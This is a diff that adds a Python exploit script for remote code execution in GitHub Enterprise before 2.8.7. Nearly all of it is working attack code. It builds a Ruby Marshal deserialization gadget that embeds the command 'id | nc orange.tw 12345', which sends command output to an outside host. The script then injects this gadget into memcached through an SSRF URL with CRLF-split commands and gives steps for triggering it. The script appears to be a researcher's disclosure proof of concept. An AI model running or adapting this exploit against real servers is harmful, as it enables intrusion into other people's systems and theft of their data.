@@ -1,0 +1,30 @@
+#!/usr/bin/python
+from urllib import quote
+
+''' set up the marshal payload from IRB
+code = "`id | nc orange.tw 12345`"
+p "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
+'''
+marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`id | nc orange.tw 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'
+
+payload = [
+    '',
+    'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
+    marshal_code,
+    '',
+    ''
+]
+
+payload = map(quote, payload)
+url = 'http://0:8000/composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/'
+
+print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by orange@chroot.org"
+print '-'*10 + '\n'
+print url + '%0D%0A'.join(payload)
+print '''
+Inserting WebHooks from:
+https://ghe-server/:user/:repo/settings/hooks
+
+Triggering RCE from:
+https://ghe-server/search?q=ggggg&type=Repositories
+'''
